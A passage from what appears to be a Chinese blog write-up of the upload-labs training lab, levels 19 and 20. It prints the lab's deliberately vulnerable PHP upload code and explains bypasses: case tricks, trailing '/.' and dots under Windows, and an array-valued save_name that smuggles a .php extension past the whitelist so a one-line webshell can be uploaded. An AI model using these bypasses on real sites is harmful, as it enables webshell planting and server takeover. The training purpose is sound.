            if (move_uploaded_file($temp_file, $img_path)) { 
                $is_upload = true;
            }else{
                $msg = '上传出错！';
            }
        }else{
            $msg = '禁止保存为该类型文件！';
        }

    } else {
        $msg = UPLOAD_PATH . '文件夹不存在,请手工创建！';
    }
}</code></pre>
    <h4 id="%E6%80%9D%E8%B7%AF%E4%B8%80%EF%BC%8C%E7%BB%95%E8%BF%87%E5%A4%A7%E5%B0%8F%E5%86%99" name="%E6%80%9D%E8%B7%AF%E4%B8%80%EF%BC%8C%E7%BB%95%E8%BF%87%E5%A4%A7%E5%B0%8F%E5%86%99">
     思路一，绕过大小写
    </h4>
    <p>
     直接上传一个info.phP文件，然后再修改上传名称即可成功上传。
    </p>
    <p>
     <img alt="" height="612" src="https://i-blog.csdnimg.cn/direct/2826e1effb434237a4ae67f21edf840c.png" width="844"/>
    </p>
    <p>
     访问
    </p>
    <p>
     <img alt="" height="454" src="https://i-blog.csdnimg.cn/direct/edb6597e2baf40c8a5d9df0b62ed3403.png" width="1156"/>
    </p>
    <h4 id="%E6%80%9D%E8%B7%AF%E4%BA%8C" name="%E6%80%9D%E8%B7%AF%E4%BA%8C">
     思路二
    </h4>
    <blockquote>
     <p>
      没有对上传的文件做判断，只对用户输入的文件名做判断 后缀名黑名单 上传的文件名用户可控 黑名单用于用户输入的文件后缀名进行判断 move_uploaded_file()还有这么一个特性，会忽略掉文件末尾的 /.
     </p>
     <p>
      先准备PHP一句话木马，并把后缀名改为PNG再上传
     </p>
     <p>
      然后用BP来抓包，效果如下图，就是在upload-19.jpg改为upload-19.php/.
     </p>
     <p>
      因为Windows的特性后缀改为indexp.php.也可
     </p>
    </blockquote>
    <p>
     <img alt="" height="667" src="https://i-blog.csdnimg.cn/direct/8b01efd1183c4e45bfb5858e1f07dc26.png" width="729"/>
    </p>
    <p>
     <img alt="" height="352" src="https://i-blog.csdnimg.cn/direct/ab233b6831574d29b87c0e9868bedacd.png" width="924"/>
    </p>
    <p>
     上传成功
    </p>
    <p>
     <img alt="" height="481" src="https://i-blog.csdnimg.cn/direct/aa7ec01205de4a48977712bce0a56cfb.png" width="1146"/>
    </p>
    <h3 id="upload-labs-env%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3" name="upload-labs-env%E7%AC%AC%E4%BA%8C%E5%8D%81%E5%85%B3">
     upload-labs-env第二十关
    </h3>
    <h4 id="%E4%BB%A3%E7%A0%81" name="%E4%BB%A3%E7%A0%81">
     代码
    </h4>
    <pre><code class="language-php">$is_upload = false;
$msg = null;
if(!empty($_FILES['upload_file'])){
    //检查MIME
    $allow_type = array('image/jpeg','image/png','image/gif');
    
    //检查上传的文件类型是否在白名单中
    if(!in_array($_FILES['upload_file']['type'],$allow_type)){
        $msg = "禁止上传该类型文件!";
    }else{
        //检查文件名
        //如果输入的save_name为空，那么使用原始的文件名，否则使用save_name上传的文件名
        $file = empty($_POST['save_name']) ? $_FILES['upload_file']['name'] : $_POST['save_name'];
        if (!is_array($file)) {
            
            //explode — 使用一个字符串分割另一个字符串
            //strtolower — 将字符串转化为小写
            $file = explode('.', strtolower($file));
        }

        
        //end — 将数组的内部指针指向最后一个单元
        $ext = end($file);
        $allow_suffix = array('jpg','png','gif');
        if (!in_array($ext, $allow_suffix)) {
            $msg = "禁止上传该后缀文件!";
        }else{
            
            //reset — 将数组的内部指针指向第一个单元
            $file_name = reset($file) . '.' . $file[count($file) - 1];
            $temp_file = $_FILES['upload_file']['tmp_name'];
            $img_path = UPLOAD_PATH . '/' .$file_name;
            if (move_uploaded_file($temp_file, $img_path)) {
                $msg = "文件上传成功！";
                $is_upload = true;
            } else {
                $msg = "文件上传失败！";
            }
        }
    }
}else{
    $msg = "请选择要上传的文件！";
}</code></pre>
    <p>
     函数分析
    </p>
    <pre><code class="language-php">php
empty()   		 //函数用于检查一个变量是否为空。
explode(separator,string,limit) 		 //函数把字符串打散为数组。
                separator 	必需。规定在哪里分割字符串。
                string 	必需。要分割的字符串。
                limit 	可选。规定所返回的数组元素的数目。

                可能的值：

                大于 0 - 返回包含最多 limit 个元素的数组
                小于 0 - 返回包含除了最后的 -limit 个元素以外的所有元素的数组
                0 - 返回包含一个元素的数组

strtolower() 	 //把所有字符转换为小写：  
count()  		 //计算数组中的单元数目，或对象中的属性个数
end() 			 //函数将内部指针指向数组中的最后一个元素，并输出。    
reset()    		 //输出数组中的当前元素和下一个元素的值，然后把数组的内部指针重置到数组中的第一个元素：</code></pre>
    <h4 id="%E6%80%9D%E8%B7%AF" name="%E6%80%9D%E8%B7%AF">
     思路
    </h4>
    <p>
     需要绕过对非数组进行分割
    </p>
    <p>
     如果将数组传为
     <code>
      save_name=["muma.php",不设置,"jpg"]
     </code>
     ，当我们save_name[1]不设置的时候，count结果仍然是2，但是文件名后缀拼接出来为空，结果为muma.php. 再根据windows特性将
     <code>
      .
     </code>
     省略，达到文件上传的目的
    </p>
    <h4 id="%E6%B5%8B%E8%AF%95" name="%E6%B5%8B%E8%AF%95">
     测试
    </h4>
    <p>
     burpsuite改包
    </p>
    <p>
     <img alt="" height="694" src="https://i-blog.csdnimg.cn/direct/2358fc10be1744739f548b738224d078.png" width="1014"/>
    </p>
    <p>
     上传查看
    </p>
    <p>
     <img alt="" height="433" src="https://i-blog.csdnimg.cn/direct/fc05ee2ecc504c9bb63538b61e830307.png" width="844"/>
    </p>
    <p>
     我们使用vscode来debug一下，看一下代码内部的走向
    </p>
    <blockquote>
     <pre><code class="language-php">if(!empty($_FILES['upload_file'])){<!-- --></code></pre>
     <p>
      上传不为空，进入if条件语句
     </p>
     <pre><code class="language-php">$allow_type为image/jpeg</code></pre>
     <p>
      继续
     </p>
     <p>
      检测上传文件的种类在不在数组$allow_type中
     </p>
     <p>
      在，进入else条件语句
     </p>
     <p>
      检测到
     </p>
     <p>
      传入save_name是个数组，有值，赋值给$file
     </p>
     <img alt="" height="339" src="https://i-blog.csdnimg.cn/direct/23eca1bccb474f4987eac8cc0376c80f.png" width="559"/>
    </blockquote>
    <blockquote>
     <pre><code class="language-php">if (!is_array($file)) {<!-- --></code></pre>
     <p>
      检测$file是否数组，如果不是，分割成数组
     </p>
     <p>
      是数组，绕过if条件语句
     </p>
     <pre><code class="language-php">$ext = end($file);</code></pre>
     <p>
      将数组的最后一位赋值给$ext
     </p>
     <p>
      即$ext = array(2) = jpg
     </p>
     <img alt="" height="199" src="https://i-blog.csdnimg.cn/direct/ffccefa710364b4bac839ff6050b8b40.png" width="859"/>
    </blockquote>
    <blockquote>
     <pre><code class="language-php">xxxxxxxxxx2 1    $allow_suffix = array('jpg','png','gif');2    if (!in_array($ext, $allow_suffix)) {<!-- --></code></pre>
     <p>
      $ext是否在白名单中
     </p>
     <p>
      在
     </p>
     <p>
      进入else条件判断
     </p>
     <p>
      拼接赋值,数组中第一个值拼接数组中array(数组长度-1)的值
     </p>
     <p>
      $file_name = test.php.
     </p>
     <pre><code class="language-php">			//reset — 将数组的内部指针指向第一个单元
            $file_name = reset($file) . '.' . $file[count($file) - 1];</code></pre>
     <p>
      <img alt="" height="147" src="https://i-blog.csdnimg.cn/direct/a0ca5af4223a417c83ce9249ce7f0ecc.png" width="1335"/>
     </p>
     <p>
      Windows存储模式，忽略后面的 . 存储为test.php
     </p>
    </blockquote>
   </div>
  </div>
 </article>
 <p alt="68747470733a2f2f626c6f672e:6373646e2e6e65742f77656978696e5f37333932313439392f:61727469636c652f64657461696c732f313436303733373935" class_="artid" style="display:none">
 </p>
</div>


